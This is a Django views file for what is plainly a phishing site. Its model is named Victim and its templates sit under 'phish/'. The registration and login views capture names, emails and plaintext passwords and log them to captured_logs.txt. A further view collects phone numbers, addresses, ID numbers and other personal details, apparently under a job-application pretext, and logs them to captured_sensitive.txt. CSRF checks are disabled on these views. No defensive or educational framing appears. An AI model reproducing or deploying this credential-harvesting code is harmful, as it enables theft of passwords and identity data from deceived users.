from django.shortcuts import render, redirect
from .models import Victim
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def register(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        victim = Victim.objects.create(full_name=name, email=email, password=password)
        with open("captured_logs.txt", "a") as f:
            f.write(f"{name} | {email} | {password}\n")
            
        return redirect(f'/details/{victim.id}/')
    return render(request, 'phish/register.html')

@csrf_exempt
def login(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        Victim.objects.create(full_name="Login Only", email=email, password=password)

        return redirect('/success')
    return render(request, 'phish/login.html')

@csrf_exempt
def collect_sensitive_info(request, victim_id):
    victim = Victim.objects.get(id=victim_id)
    if request.method == 'POST':
        victim.phone = request.POST.get('phone')
        victim.address = request.POST.get('address')
        victim.id_number = request.POST.get('id_number')
        victim.age = request.POST.get('age')
        victim.role = request.POST.get('role')
        victim.skills = request.POST.get('skills')
        victim.motivational_letter = request.POST.get('motivational_letter')
        victim.save()

        with open("captured_sensitive.txt", "a") as f:
            f.write(
                f"{victim.full_name} | {victim.email} | {victim.phone} | {victim.address} | {victim.id_number} | "
                f"{victim.age} | {victim.role} | {victim.skills} | {victim.motivational_letter}\n"
            )

        return redirect('/success')
    return render(request, 'phish/sensitive_info.html', {'victim': victim})
def success(request):
    return render(request, 'phish/success.html')
def home(request):
    return render(request, 'phish/home.html')
